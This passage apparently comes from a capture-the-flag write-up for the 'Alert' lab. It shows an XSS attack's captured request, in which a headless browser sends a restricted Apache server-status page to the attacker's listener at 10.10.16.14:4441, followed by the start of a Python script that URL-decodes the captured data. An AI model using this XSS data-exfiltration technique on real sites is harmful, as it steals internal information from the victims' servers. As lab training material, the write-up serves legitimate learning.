Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3783%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E55-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3782%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E56-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3313%3C%2Ftd%3E%3Ctd%3E2%2F43%2F43%3C%2Ftd%3E%3Ctd%3E%3Cb%3EW%3C%2Fb%3E%0A%3C%2Ftd%3E%3Ctd%3E0.01%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E15%3C%2Ftd%3E%3Ctd%3E2.9%3C%2Ftd%3E%3Ctd%3E0.04%3C%2Ftd%3E%3Ctd%3E0.04%0A%3C%2Ftd%3E%3Ctd%3E127.0.0.1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2Fserver-status%2F%20HTTP%2F1.1%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E57-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F22%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3760%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E2%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E58-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F20%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3756%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E3%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E59-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F20%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3758%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E3%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E60-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F19%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3752%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E2%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E61-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F16%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3738%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E1%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E62-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F18%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3741%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E1%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E63-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F17%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3743%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E2%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E64-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3321%3C%2Ftd%3E%3Ctd%3E0%2F57%2F57%3C%2Ftd%3E%3Ctd%3E_%0A%3C%2Ftd%3E%3Ctd%3E0.01%3C%2Ftd%3E%3Ctd%3E15%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E80%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.04%3C%2Ftd%3E%3Ctd%3E0.04%0A%3C%2Ftd%3E%3Ctd%3E127.0.0.1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Estatistics.alert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2F%20HTTP%2F1.1%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E65-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F16%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3739%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E1%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E66-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3323%3C%2Ftd%3E%3Ctd%3E0%2F60%2F60%3C%2Ftd%3E%3Ctd%3E_%0A%3C%2Ftd%3E%3Ctd%3E0.01%3C%2Ftd%3E%3Ctd%3E246%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E94%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.05%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E10.10.16.14%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2Fcss%2Fpath-to-markdown-background-image%20HTTP%2F1.1%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E67-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3744%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E68-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F14%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3751%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E1%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E69-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F15%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3737%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E2%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%0A%20%3Chr%20%2F%3E%20%3Ctable%3E%0A%20%3Ctr%3E%3Cth%3ESrv%3C%2Fth%3E%3Ctd%3EChild%20Server%20number%20-%20generation%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EPID%3C%2Fth%3E%3Ctd%3EOS%20process%20ID%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EAcc%3C%2Fth%3E%3Ctd%3ENumber%20of%20accesses%20this%20connection%20%2F%20this%20child%20%2F%20this%20slot%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EM%3C%2Fth%3E%3Ctd%3EMode%20of%20operation%3C%2Ftd%3E%3C%2Ftr%3E%0A%3Ctr%3E%3Cth%3ECPU%3C%2Fth%3E%3Ctd%3ECPU%20usage%2C%20number%20of%20seconds%3C%2Ftd%3E%3C%2Ftr%3E%0A%3Ctr%3E%3Cth%3ESS%3C%2Fth%3E%3Ctd%3ESeconds%20since%20beginning%20of%20most%20recent%20request%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EReq%3C%2Fth%3E%3Ctd%3EMilliseconds%20required%20to%20process%20most%20recent%20request%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EDur%3C%2Fth%3E%3Ctd%3ESum%20of%20milliseconds%20required%20to%20process%20all%20requests%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EConn%3C%2Fth%3E%3Ctd%3EKilobytes%20transferred%20this%20connection%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EChild%3C%2Fth%3E%3Ctd%3EMegabytes%20transferred%20this%20child%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3ESlot%3C%2Fth%3E%3Ctd%3ETotal%20megabytes%20transferred%20this%20slot%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3C%2Ftable%3E%0A%3Chr%20%2F%3E%0A%3Caddress%3EApache%2F2.4.41%20(Ubuntu)%20Server%20at%20alert.htb%20Port%2080%3C%2Faddress%3E%0A%3C%2Fbody%3E%3C%2Fhtml%3E%0A HTTP/1.1
Host: 10.10.16.14:4441
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
Accept: */*
Origin: http://alert.htb
Referer: http://alert.htb/
Accept-Encoding: gzip, deflate
```

The restricted page (in this case `http://alert.htb/system-status/`) is successfully retrieved through the XSS exploit, but the data is encoded and a bit difficult to read.

## Decoding and displaying of restricted page

Python was used to decode the data and display it via an http server.

### Python script

```python
import urllib.parse

encoded_data = """%3C!DOCTYPE%20HTML%20PUBLIC%20%22-%2F%2FW3C%2F%2FDTD%20HTML%203.2%20Final%2F%2FEN%22%3E%0A%3Chtml%3E%3Chead%3E%0A%3Ctitle%3EApache%20Status%3C%2Ftitle%3E%0A%3C%2Fhead%3E%3Cbody%3E%0A%3Ch1%3EApache%20Server%20Status%20for%20alert.htb%20(via%20127.0.0.1)%3C%2Fh1%3E%0A%0A%3Cdl%3E%3Cdt%3EServer%20Version%3A%20Apache%2F2.4.41%20(Ubuntu)%3C%2Fdt%3E%0A%3Cdt%3EServer%20MPM%3A%20prefork%3C%2Fdt%3E%0A%3Cdt%3EServer%20Built%3A%202024-07-17T18%3A58%3A09%0A%3C%2Fdt%3E%3C%2Fdl%3E%3Chr%20%2F%3E%3Cdl%3E%0A%3Cdt%3ECurrent%20Time%3A%20Saturday%2C%2022-Feb-2025%2007%3A06%3A23%20UTC%3C%2Fdt%3E%0A%3Cdt%3ERestart%20Time%3A%20Saturday%2C%2022-Feb-2025%2004%3A46%3A53%20UTC%3C%2Fdt%3E%0A%3Cdt%3EParent%20Server%20Config.%20Generation%3A%201%3C%2Fdt%3E%0A%3Cdt%3EParent%20Server%20MPM%20Generation%3A%200%3C%2Fdt%3E%0A%3Cdt%3EServer%20uptime%3A%20%202%20hours%2019%20minutes%2029%20seconds%3C%2Fdt%3E%0A%3Cdt%3EServer%20load%3A%200.00%200.00%200.00%3C%2Fdt%3E%0A%3Cdt%3ETotal%20accesses%3A%205646%20-%20Total%20Traffic%3A%203.3%20MB%20-%20Total%20Duration%3A%202311%3C%2Fdt%3E%0A%3Cdt%3ECPU%20Usage%3A%20u.11%20s.23%20cu.49%20cs.32%20-%20.0137%25%20CPU%20load%3C%2Fdt%3E%0A%3Cdt%3E.675%20requests%2Fsec%20-%20407%20B%2Fsecond%20-%20603%20B%2Frequest%20-%20.409316%20ms%2Frequest%3C%2Fdt%3E%0A%3Cdt%3E2%20requests%20currently%20being%20processed%2C%208%20idle%20workers%3C%2Fdt%3E%0A%3C%2Fdl%3E%3Cpre%3E...............W._......_......__....._............._..._.......%0A_.K.............................................................%0A......................%3C%2Fpre%3E%0A%3Cp%3EScoreboard%20Key%3A%3Cbr%20%2F%3E%0A%22%3Cb%3E%3Ccode%3E_%3C%2Fcode%3E%3C%2Fb%3E%22%20Waiting%20for%20Connection%2C%20%0A%22%3Cb%3E%3Ccode%3ES%3C%2Fcode%3E%3C%2Fb%3E%22%20Starting%20up%2C%20%0A%22%3Cb%3E%3Ccode%3ER%3C%2Fcode%3E%3C%2Fb%3E%22%20Reading%20Request%2C%3Cbr%20%2F%3E%0A%22%3Cb%3E%3Ccode%3EW%3C%2Fcode%3E%3C%2Fb%3E%22%20Sending%20Reply%2C%20%0A%22%3Cb%3E%3Ccode%3EK%3C%2Fcode%3E%3C%2Fb%3E%22%20Keepalive%20(read)%2C%20%0A%22%3Cb%3E%3Ccode%3ED%3C%2Fcode%3E%3C%2Fb%3E%22%20DNS%20Lookup%2C%3Cbr%20%2F%3E%0A%22%3Cb%3E%3Ccode%3EC%3C%2Fcode%3E%3C%2Fb%3E%22%20Closing%20connection%2C%20%0A%22%3Cb%3E%3Ccode%3EL%3C%2Fcode%3E%3C%2Fb%3E%22%20Logging%2C%20%0A%22%3Cb%3E%3Ccode%3EG%3C%2Fcode%3E%3C%2Fb%3E%22%20Gracefully%20finishing%2C%3Cbr%20%2F%3E%20%0A%22%3Cb%3E%3Ccode%3EI%3C%2Fcode%3E%3C%2Fb%3E%22%20Idle%20cleanup%20of%20worker%2C%20%0A%22%3Cb%3E%3Ccode%3E.%3C%2Fcode%3E%3C%2Fb%3E%22%20Open%20slot%20with%20no%20current%20process%3Cbr%20%2F%3E%0A%3C%2Fp%3E%0A%0A%0A%3Ctable%20border%3D%220%22%3E%3Ctr%3E%3Cth%3ESrv%3C%2Fth%3E%3Cth%3EPID%3C%2Fth%3E%3Cth%3EAcc%3C%2Fth%3E%3Cth%3EM%3C%2Fth%3E%3Cth%3ECPU%0A%3C%2Fth%3E%3Cth%3ESS%3C%2Fth%3E%3Cth%3EReq%3C%2Fth%3E%3Cth%3EDur%3C%2Fth%3E%3Cth%3EConn%3C%2Fth%3E%3Cth%3EChild%3C%2Fth%3E%3Cth%3ESlot%3C%2Fth%3E%3Cth%3EClient%3C%2Fth%3E%3Cth%3EProtocol%3C%2Fth%3E%3Cth%3EVHost%3C%2Fth%3E%3Cth%3ERequest%3C%2Fth%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E0-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F211%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E710%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E949%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.14%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E1-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F206%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E725%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E49%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.14%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E2-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F211%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E723%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E171%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.16%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E3-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F241%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E674%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E129%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.17%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E4-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F210%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E712%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E133%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.14%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E5-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F225%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E711%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E58%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.16%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E6-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F199%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E714%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E48%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.13%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E7-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E722%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E11%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E8-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F114%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E699%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E13%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.06%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%